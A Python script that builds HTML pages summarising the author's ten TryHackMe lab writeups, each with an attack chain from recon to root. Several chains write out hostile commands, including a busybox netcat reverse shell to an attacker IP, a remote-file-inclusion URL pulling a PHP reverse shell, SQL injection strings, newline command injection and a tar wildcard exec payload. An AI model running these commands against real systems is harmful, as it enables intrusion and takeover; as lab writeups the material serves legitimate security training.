

# ===========================================================
# STUB GENERATOR — สร้างหน้า writeup ที่เหลือทั้ง 10 ไฟล์
# ===========================================================

WRITEUPS = [
    {
        "file": "brainpan1.html",
        "title": "Brainpan 1",
        "diff": "Hard",
        "os": "Linux (Ubuntu + Wine — 32-bit PE)",
        "ip": "10.48.175.164",
        "vector": "Stack Buffer Overflow (x86) → Linux Reverse Shell → Sudo NOPASSWD Privesc",
        "chain": """Recon (Nmap)
  → Port 9999 (Brainpan service) · Port 10000 (Python SimpleHTTPServer)
  → Download brainpan.exe from /bin/brainpan.exe
  → Fuzz with fuzz.py → crash at 600 bytes
  → msf-pattern_create -l 1000 → EIP offset = 524
  → Mona bytearray → Bad char = \\x00 only
  → !mona jmp -r esp → JMP ESP at 0x311712f3
  → msfvenom linux/x86/shell_reverse_tcp → 95-byte shellcode
  → exploit.py → nc -lvnp 4444 → shell as puck
  → sudo -l → (root) NOPASSWD: /home/anansi/bin/anansi_util
  → sudo /home/anansi/bin/anansi_util manual man
  → !/bin/bash → root@brainpan""",
        "table": [
            ("Room Name", "Brainpan 1"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu / Wine — 32-bit PE)"),
            ("Target IP", "10.48.175.164"),
            ("Attacker IP", "192.168.132.94"),
            ("Difficulty", "Hard"),
            ("Key Techniques", "Stack Buffer Overflow, JMP ESP gadget, msfvenom, Sudo NOPASSWD pager escape"),
        ],
        "tools": ["Nmap", "Immunity Debugger + Mona.py", "msf-pattern_create", "msfvenom", "Netcat"],
    },
    {
        "file": "daily-bugle.html",
        "title": "Daily Bugle",
        "diff": "Medium",
        "os": "Linux (CentOS 7.x)",
        "ip": "10.48.187.164",
        "vector": "Joomla SQLi CVE-2017-8917 → Bcrypt Crack → Template RCE → Sudo yum Privesc",
        "chain": """Recon (Nmap)
  → Port 22 (SSH) · Port 80 (Apache + Joomla 3.7.0) · Port 3306 (MariaDB)
  → joomblah.py → extract jonah bcrypt hash
  → john --format=bcrypt → cracked: ████████
  → Login /administrator → Extensions > Templates > Beez3 > index.php
  → Inject PHP reverse shell → penelope nc -p 4444
  → Shell as apache
  → grep -rn "password" /var/www/ → /configuration.php → DB password: ████████
  → su jjameson → user.txt → ████████████████████████████████
  → sudo -l → (ALL) NOPASSWD: /usr/bin/yum
  → GTFOBins yum plugin → sh-4.2# whoami root
  → cat root.txt → ████████████████████████████████""",
        "table": [
            ("Room Name", "Daily Bugle"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (CentOS 7.x)"),
            ("Target IP", "10.48.187.164"),
            ("Attacker IP", "192.168.132.94"),
            ("Difficulty", "Medium"),
            ("Key CVEs", "CVE-2017-8917 (Joomla 3.7.0 SQLi)"),
        ],
        "tools": ["Nmap", "joomblah.py", "John the Ripper", "Penelope", "GTFOBins"],
    },
    {
        "file": "deaddrop.html",
        "title": "Deaddrop",
        "diff": "Medium/Hard",
        "os": "Linux (Ubuntu 24.04) + Windows Server 2019 (AD)",
        "ip": "192.168.11.200 / 192.168.11.100",
        "vector": "SQLi → Node.js RCE → APK Reversing → SSH Pivot → AD ACL Abuse",
        "chain": """Recon (Nmap)
  → Port 22 (SSH) · Port 80 (Node.js Express — DeadDrop login)
  → SQL injection: admin'-- → bypass login as admin
  → Upload shell.js (Node.js reverse shell) → /preview/shell.js
  → Shell as node@tryhackme-2404
  → /opt/app/backup/shadow.bak → john → svc-drop : ████████
  → SSH as svc-drop → ~/backup/deaddrop-mobile.apk
  → jadx-gui → DEFAULT_PASSWORD = "████████" (j.harris)
  → SSH SOCKS proxy: ssh -N -D 9050 svc-drop@192.168.11.200
  → proxychains nxc smb 192.168.11.100 -u j.harris -p '████████' → Valid!
  → BloodHound → J.HARRIS has AddMember on ADMINISTRATORS
  → proxychains bloodyAD add groupMember 'Administrators' 'j.harris'
  → proxychains nxc smb 192.168.11.100 -x "type flag.txt"
  → THM{████████████████████████████████}""",
        "table": [
            ("Room Name", "Deaddrop"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu 24.04) + Windows Server 2019"),
            ("External IP", "192.168.11.200"),
            ("Internal DC IP", "192.168.11.100 (DEADDROP-DC)"),
            ("Difficulty", "Medium/Hard"),
            ("Key Techniques", "SQLi, Node.js RCE, APK Static Analysis, SOCKS Pivot, AD ACL (AddMember)"),
        ],
        "tools": ["Nmap", "Penelope", "John the Ripper", "JADX-GUI", "Proxychains", "BloodHound", "bloodyAD", "NetExec", "Evil-WinRM"],
    },
    {
        "file": "domino.html",
        "title": "Domino",
        "diff": "Medium",
        "os": "Linux (Ubuntu 24.04)",
        "ip": "10.49.148.24",
        "vector": "Hydra → IDOR → JWT Tamper → LFI → AES Decrypt → SSH → Cron Hijack → Root",
        "chain": """Recon (Nmap)
  → Port 22 (SSH) · Port 80 (Apache — NexusCorp Portal)
  → Gobuster → /backup /static /api
  → /backup/README.txt → config.enc (AES-128-ECB), key in static/app.js
  → /static/app.js → _backupKey: '████████'
  → /team.php → employee list → username: sarah.johnson
  → Hydra HTTP POST → sarah.johnson : ████████
  → Dashboard → /api/users/profile.php?id=1 → IDOR → Flag 1 (laura.hayes admin notes)
  → Flag 1: THM{████████████████████████████████}
  → JWT token → Base64 decode → "role":"user" → "role":"admin" → forge JWT
  → /api/files.php?name=/var/www/html/config.php → LFI → DB_PASS = ████████
  → openssl AES-128-ECB decrypt config.enc → system_user: devops
  → SSH devops@10.49.148.24 (password: ████████)
  → user.txt → THM{████████████████████████████████}  [Flag 4]
  → /opt/flag3.txt → THM{████████████████████████████████}  [Flag 3]
  → pspy64 → cron UID=0 → /opt/monitoring/health_report.sh (writable by devops!)
  → Inject bash reverse shell into health_report.sh
  → root shell → root.txt → THM{████████████████████████████████}  [Flag 5]""",
        "table": [
            ("Room Name", "Domino"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu 24.04.4 LTS)"),
            ("Target IP", "10.49.148.24"),
            ("Difficulty", "Medium"),
            ("Key Techniques", "IDOR, JWT Tampering, LFI, AES-128-ECB Decrypt, Cron Hijack"),
        ],
        "tools": ["Nmap", "Gobuster", "Hydra", "curl", "OpenSSL", "pspy64", "Penelope"],
    },
    {
        "file": "forward.html",
        "title": "Forward",
        "diff": "Hard",
        "os": "Windows Server 2019 (Build 17763) — Active Directory",
        "ip": "10.48.167.228 (DC01.ctf.local)",
        "vector": "BloodHound → Kerberoasting → Password Spray → RBCD → Domain Admin",
        "chain": """Recon (Nmap)
  → Active Directory domain services on DC01.ctf.local (10.48.167.228)
  → BloodHound → targets: svc.helpdesk, r.williams
  → Kerberoasting svc.helpdesk → Hashcat → not cracked
  → RDP as j.smith → stored credentials: t.jones : ████████
  → NetExec spraying: nxc smb DC01 -u user.txt -p '████████' → r.williams : ████████
  → BloodHound → r.williams has AddAllowedToAct on DC01$
  → impacket-addcomputer → ATTACKER$ : ████████
  → impacket-rbcd → delegate ATTACKER$ → DC01$
  → impacket-getST → S4U2Proxy → Administrator ticket
  → KRB5CCNAME=... impacket-psexec -k -no-pass DC01.ctf.local
  → nt authority\\system
  → type flag.txt → THM{████████████████████████████████}""",
        "table": [
            ("Room Name", "Forward"),
            ("Platform", "TryHackMe"),
            ("OS", "Windows Server 2019 (Build 17763)"),
            ("Domain", "ctf.local"),
            ("Target IP", "10.48.167.228 (DC01.ctf.local)"),
            ("Difficulty", "Hard"),
            ("Key Techniques", "BloodHound, RBCD, S4U2Proxy, Kerberoasting, NetExec, Impacket Suite"),
        ],
        "tools": ["Nmap", "BloodHound", "Hashcat", "NetExec (nxc)", "Impacket Suite"],
    },
    {
        "file": "internal.html",
        "title": "Internal",
        "diff": "Hard",
        "os": "Linux (Ubuntu) + Docker",
        "ip": "10.10.x.x",
        "vector": "WordPress WPScan → Theme RCE → Docker Container → Jenkins Hydra → SSH → Root",
        "chain": """Recon (Nmap)
  → Port 22 (SSH) · Port 80 (Apache + WordPress)
  → WPScan → username: admin → brute-force → admin : ████████
  → WP Admin → Appearance > Theme Editor > twentyseventeen/index.php → PHP shell
  → Shell as www-data
  → /etc/hosts → Docker container: 172.17.0.2
  → Pivot into Docker → Jenkins on :8080
  → Hydra HTTP POST → admin : ████████
  → Jenkins Groovy Script Console → reverse shell
  → Credentials in /var/jenkins_home → SSH key for aubreanna
  → SSH aubreanna → user.txt
  → Port forward Jenkins → password in note.txt → su root
  → root.txt""",
        "table": [
            ("Room Name", "Internal"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu) + Docker"),
            ("Difficulty", "Hard"),
            ("Key Techniques", "WordPress WPScan, Theme Editor RCE, Docker Pivot, Jenkins Hydra HTTP-POST"),
        ],
        "tools": ["Nmap", "WPScan", "Hydra", "Penelope", "SSH Port Forwarding"],
    },
    {
        "file": "mrrobotctf.html",
        "title": "Mr. Robot CTF",
        "diff": "Medium",
        "os": "Linux",
        "ip": "10.48.165.195",
        "vector": "robots.txt → WordPress Brute-force → Theme RCE → MD5 Crack → SUID Nmap",
        "chain": """Recon (Nmap)
  → Port 80 (HTTP) · Port 443 (HTTPS)
  → /robots.txt → fsocity.dic, key-1-of-3.txt
  → Key 1: ████████████████████████████████
  → sort -u fsocity.dic → WPScan -U elliot -P wordlist
  → elliot : ████████
  → Appearance > Editor > 404.php → PHP reverse shell
  → Shell as daemon
  → /home/robot/password.raw-md5 → c3fcd3d76192e4007dfb496cca67e13b
  → John / CrackStation → ████████
  → su robot → cat key-2-of-3.txt → ████████████████████████████████
  → find / -perm -u=s -f → /usr/local/bin/nmap (SUID)
  → nmap --interactive → !/bin/bash → root
  → cat /root/key-3-of-3.txt → ████████████████████████████████""",
        "table": [
            ("Room Name", "Mr. Robot CTF"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux"),
            ("Target IP", "10.48.165.195"),
            ("Difficulty", "Medium"),
            ("Key Techniques", "Information Disclosure, WordPress Brute-force, Theme RCE, MD5 Crack, SUID Nmap"),
        ],
        "tools": ["Nmap", "WPScan", "Penelope", "John the Ripper", "CrackStation"],
    },
    {
        "file": "relevant.html",
        "title": "Relevant",
        "diff": "Medium",
        "os": "Windows Server 2019",
        "ip": "10.10.x.x",
        "vector": "Anonymous SMB → Credential Recovery → SMB Shell Upload → Token Impersonation",
        "chain": """Recon (Nmap)
  → Port 80 (IIS) · Port 445 (SMB) · Port 3389 (RDP) · Port 49663 (IIS)
  → smbclient -N → nt4wrksv share → passwords.txt
  → cat passwords.txt → Base64-encoded credentials → Bill : [REDACTED]
  → Port 49663 maps to nt4wrksv SMB share → upload aspx shell
  → msfvenom windows/x64/shell_reverse_tcp → shell.aspx → trigger via browser
  → Shell as iis apppool\\defaultapppool
  → whoami /priv → SeImpersonatePrivilege Enabled
  → PrintSpoofer.exe -i -c cmd → nt authority\\system
  → user.txt (Bob Desktop) · root.txt (Administrator Desktop)""",
        "table": [
            ("Room Name", "Relevant"),
            ("Platform", "TryHackMe"),
            ("OS", "Windows Server 2019"),
            ("Difficulty", "Medium"),
            ("Key Techniques", "Anonymous SMB, Base64 Credential Recovery, ASPX Web Shell, PrintSpoofer, SeImpersonatePrivilege"),
        ],
        "tools": ["Nmap", "smbclient", "msfvenom", "PrintSpoofer"],
    },
    {
        "file": "silent-monitor.html",
        "title": "Silent Monitor",
        "diff": "Medium",
        "os": "Linux (Ubuntu 22.04)",
        "ip": "10.48.130.140",
        "vector": "SQLi Auth Bypass → Newline Command Injection → Config Creds → SSH → KeePass → Root",
        "chain": """Recon (Nmap)
  → Port 22 (SSH) · Port 5050 (Werkzeug — CorpNet NOC Portal v2.4.1)
  → Gobuster → /internal (login page)
  → SQL injection: ' or 1=1 -- - → login as netops
  → Host Health Check → target=127.0.0.1\\nwhoami → www-data
  → Burp Suite → POST body newline injection
  → busybox nc 192.168.132.94 4444 -e /bin/sh → shell as www-data
  → /opt/netops/secret.config → sysadmin : ████████
  → SSH sysadmin → user.txt → THM{████████████████████████████████}
  → ~/backups/infrastructure.kdbx
  → keepass2john + john → master: ████████
  → KeePassXC → root : ████████
  → su root → root.txt → THM{████████████████████████████████}""",
        "table": [
            ("Room Name", "Silent Monitor"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu 22.04.5 LTS)"),
            ("Target IP", "10.48.130.140"),
            ("Difficulty", "Medium"),
            ("Key Techniques", "SQLi, OS Command Injection (newline), Hardcoded Credentials, KeePass Cracking"),
        ],
        "tools": ["Nmap", "Gobuster", "Burp Suite", "Penelope", "keepass2john", "John the Ripper", "KeePassXC"],
    },
    {
        "file": "skynet.html",
        "title": "Skynet",
        "diff": "Medium",
        "os": "Linux (Ubuntu)",
        "ip": "10.49.175.147",
        "vector": "Anonymous SMB → Log Wordlist → Hydra SquirrelMail → Miles Dyson SMB → Cuppa RFI → Tar Wildcard → Root",
        "chain": """Recon (Nmap)
  → Port 80 (Apache) · Port 110/143 (IMAP) · Port 139/445 (SMB)
  → smbclient -N → anonymous share
  → attention.txt + log1.txt (password wordlist)
  → Gobuster → /squirrelmail
  → Hydra HTTP POST → milesdyson : ████████
  → Webmail INBOX → email from skynet → Samba password: [REDACTED]
  → smbclient → milesdyson share → important.txt → hidden dir
  → Gobuster on /45kra24zxs28v3yd → /administrator (Cuppa CMS)
  → Cuppa CMS RFI: ?urlConfig=http://attacker/phpreverse.php
  → Shell as www-data
  → /home/milesdyson/user.txt → ████████████████████████████████
  → pspy64 → cron: cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *
  → tar wildcard injection → --checkpoint=1 --checkpoint-action=exec=sh shell.sh
  → chmod u+s /bin/bash → /bin/bash -p → root
  → /var/www/html/rootbash -p -c "cat /root/root.txt" → ████████████████████████████████""",
        "table": [
            ("Room Name", "Skynet"),
            ("Platform", "TryHackMe"),
            ("OS", "Linux (Ubuntu)"),
            ("Target IP", "10.49.175.147"),
            ("Difficulty", "Medium"),
            ("Key Techniques", "Anonymous SMB, Hydra SquirrelMail, Cuppa CMS RFI, Tar Wildcard SUID"),
        ],
        "tools": ["Nmap", "smbclient", "Gobuster", "Hydra", "pspy64", "Penelope"],
    },
]

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>{title} — OfflineDevc Writeups</title>
  <link rel="stylesheet" href="../style.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
</head>
<body>

  <nav class="navbar">
    <div class="nav-inner">
      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
      <div class="nav-links">
        <a href="../index.html#about">About</a>
        <a href="../index.html#writeups">Writeups</a>
        <a href="../index.html#contact">Contact</a>
      </div>
    </div>
  </nav>

  <header class="writeup-hero">
    <div class="writeup-hero-inner">
      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
      <div class="card-header" style="margin-bottom:12px">
        <span class="platform thm-badge">THM</span>
        <span class="difficulty {diff_class}-badge">{diff}</span>
      </div>
      <h1 class="writeup-title">{title}</h1>
      <p style="color:#666;font-size:14px;margin-top:8px">{os} · {vector}</p>
      <div class="meta-row">
        <div class="meta-item">🖥 OS: <span>{os}</span></div>
        <div class="meta-item">🎯 Target: <span><code>{ip}</code></span></div>
      </div>
    </div>
  </header>

  <article class="writeup-content">

    <table class="info-table">
{table_rows}
    </table>

    <h2>// Attack Chain</h2>
    <div class="attack-chain">{chain}</div>

    <h2>// Methodology</h2>
    <p>This writeup follows the standard penetration testing lifecycle:
    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
    <p style="color:#555;font-size:13px;margin-top:12px">
      📸 Full screenshot evidence is available in the original report.
      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
    </p>

    <h2>// Tools Used</h2>
    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
{tools_rows}
    </ul>

  </article>

  <footer class="footer">
    <div class="footer-inner">
      <div class="footer-links">
        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
      </div>
      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
    </div>
  </footer>

</body>
</html>"""

import os

out_dir = r"c:\Users\999lu\OneDrive\Desktop\github-pages-site\writeups"

for w in WRITEUPS:
    diff_class = "hard" if "Hard" in w["diff"] else "medium" if "Medium" in w["diff"] else "easy"
    
    table_rows = "\n".join(
        f'      <tr><th>{k}</th><td>{v}</td></tr>' for k, v in w["table"]
    )
    tools_rows = "\n".join(f"      <li><code>{t}</code></li>" for t in w["tools"])
    
    html = HTML_TEMPLATE.format(
        title=w["title"],
        diff=w["diff"],
        diff_class=diff_class,
        os=w["os"],
        ip=w["ip"],
        vector=w["vector"],
        table_rows=table_rows,
        chain=w["chain"],
        tools_rows=tools_rows,
    )
    
    path = os.path.join(out_dir, w["file"])
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"Created: {w['file']}")

print("\nDone! All 10 writeup pages generated.")
